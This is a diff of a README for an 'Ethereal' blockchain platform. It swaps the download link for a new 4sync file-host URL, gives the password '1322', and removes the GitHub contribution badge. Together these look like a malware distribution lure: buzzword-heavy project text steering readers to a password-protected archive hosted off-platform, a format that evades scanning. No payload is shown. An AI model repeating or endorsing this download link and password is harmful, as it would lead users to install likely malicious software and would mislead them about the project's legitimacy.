@@ -4,7 +4,7 @@
 
 Building the future of decentralized systems with Ethereal - an advanced blockchain infrastructure platform featuring zero-knowledge proofs, modular architecture, and enterprise-grade scalability. Powering the next evolution of Web3 applications.
 
-# [DOWNLOAD](https://www.4sync.com/zip/WamRVb3D/Project_V193.html)  
+# [DOWNLOAD](https://www.4sync.com/s/feLmqkiGe)  
 ## PASSWORD: 1322
 
 ## ⚙ Core Technical Features
@@ -60,7 +60,6 @@ Ethereal is open-source software under active development. Use in production env
 💬 **Join Developer Community**
 
 [![Discord](https://img.shields.io/badge/Discord-Developer_Chat-7289DA?logo=discord)](https://discord.gg/ethereal-dev)
-[![GitHub](https://img.shields.io/badge/GitHub-Contribute-181717?logo=github)](https://github.com/ethereal-protocol)
 
 **Technical Support & Contributions:**
 📍 **Core Development:** dev@ethereal.org
